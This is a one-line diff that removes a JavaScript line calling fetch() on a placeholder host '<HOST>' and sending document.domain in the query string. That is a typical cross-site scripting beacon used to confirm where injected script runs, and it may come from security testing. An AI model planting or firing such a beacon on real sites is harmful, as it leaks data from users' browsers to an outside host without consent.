@@ -1,1 +1,0 @@
-fetch('http://<HOST>/?document-domain='+document.domain)
